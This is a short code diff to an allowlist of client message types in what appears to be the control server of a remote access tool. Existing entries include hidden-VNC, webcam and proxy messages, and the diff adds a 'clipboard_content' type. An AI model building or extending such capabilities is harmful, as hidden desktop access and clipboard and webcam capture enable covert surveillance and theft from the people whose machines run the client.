@@ -29,8 +29,10 @@ export const ALLOWED_CLIENT_MESSAGE_TYPES = new Set([
   "webcam_devices",
   "hvnc_clone_progress",
   "hvnc_lookup_result",
+  "clipboard_content",
   "proxy_data",
   "proxy_close",
+  "disconnect_info",
 ]);
 
 export function isAllowedClientMessageType(type: string): boolean {
